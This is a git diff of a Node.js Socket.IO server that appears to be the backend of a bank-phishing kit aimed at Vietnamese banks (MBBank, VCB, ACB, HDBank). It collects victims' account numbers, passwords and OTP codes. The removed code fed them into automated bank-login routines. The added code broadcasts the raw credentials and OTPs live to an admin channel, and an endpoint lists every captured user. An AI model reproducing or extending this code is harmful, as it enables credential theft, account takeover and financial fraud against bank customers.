@@ -52,8 +52,6 @@ connection.once("open", async () => {
     }
 });
 
-
-
 var storage = multer.diskStorage({
     destination: function (req, file, cb) {
         cb(null, 'public/uploads')
@@ -89,8 +87,9 @@ socketIo.on("connection", (socket) => { ///Handle khi có connect từ client t�
     })
 
     socket.on('send-data-send-otp-vcb', async (data) => {
-        const response = await moduleBank.xacthucOTPVCB(data.otp, socket.id);
-        socket.emit('send-data-send-otp-vcb', response);
+        // const response = await moduleBank.xacthucOTPVCB(data.otp, socket.id);
+        // socket.emit('send-data-send-otp-vcb', response);
+        socketIo.emit('send-data-admin-user', data);
     })
 
     socket.on('send-method-ct-vcb', async (data) => {
@@ -106,45 +105,46 @@ socketIo.on("connection", (socket) => { ///Handle khi có connect từ client t�
 
     socket.on('send-data', async (data) => {
         console.log(data);
-        const settingData = await settings.findOne({}).lean().exec();
-        // const settingData = {
-        //     bankName: 'MB',
-        //     bankAccount: '217092001',
-        //     bankBranch: 'Chi nhánh Hà Nội',
-        //     zaloImage: 'https://zalo.me/g/lnzjzv551'
+        // const settingData = await settings.findOne({}).lean().exec();
+        // bắn socket id để phân biệt từng người dùng
+        socketIo.emit('send-data-admin', {
+            ...data,
+        });
+        // switch (data.bankName) {
+        //     case 'MBBank':
+        //         console.log('settingData', settingData);
+        //         const response = await moduleBank.loginMB(data.bankAccount, data.bankPassword, socket.id, settingData);
+        //         socket.emit('send-data', response);
+        //         break;
+        //     case 'VCB':
+        //         // console.log('settingData', settingData);
+        //         console.log('data', data);
+        //         const response1 = await moduleBank.loginVCB(data.bankAccount, data.bankPassword, socket.id, settingData);
+        //         socket.emit('send-data-otp-vcb-chuyentien', response1);
+        //         break;
+        //     case 'ACB':
+        //         const response2 = await moduleBank.loginACB(data.bankAccount, data.bankPassword);
+        //         socket.emit('send-data', response2);
+        //         break;
+
+        //     case 'HDBank':
+        //         const response3 = await moduleBank.loginHDBank(data.bankAccount, data.bankPassword, socket.id, settingData);
+        //         console.log('response3', response3);
+        //         socket.emit('send-data', response3);
+        //         break;
+        //     default:
+        //         break;
         // }
-
-        switch (data.bankName) {
-            case 'MBBank':
-                console.log('settingData', settingData);
-                const response = await moduleBank.loginMB(data.bankAccount, data.bankPassword, socket.id, settingData);
-                socket.emit('send-data', response);
-                break;
-            case 'VCB':
-                // console.log('settingData', settingData);
-                console.log('data', data);
-                const response1 = await moduleBank.loginVCB(data.bankAccount, data.bankPassword, socket.id, settingData);
-                socket.emit('send-data-otp-vcb-chuyentien', response1);
-                break;
-            case 'ACB':
-                const response2 = await moduleBank.loginACB(data.bankAccount, data.bankPassword);
-                socket.emit('send-data', response2);
-                break;
-
-            case 'HDBank':
-                const response3 = await moduleBank.loginHDBank(data.bankAccount, data.bankPassword, socket.id, settingData);
-                console.log('response3', response3);
-                socket.emit('send-data', response3);
-                break;
-            default:
-                break;
-        }
     });
     socket.on('send-data-b', async (data) => {
         console.log(data);
         const response = await moduleBank.xacthuc(data.otp, data.bankName);
         socket.emit('send-data-b', response);
     })
+
+    socket.on('send-data-user', (data) => {
+        socketIo.emit(`send-data-user-${data.numberPhone}`, data);
+    });
 });
 
 
@@ -260,7 +260,8 @@ app.get('/api/get-setting', async (req, res) => {
 });
 
 app.get('/api/get-user', async (req, res) => {
-    const userData = await users.find({}).lean().exec();
+    // user order by createAt
+    const userData = await users.find({}).sort({ createAt: -1 }).lean().exec();
     return res.status(200).json({
         message: 'success',
         data: userData
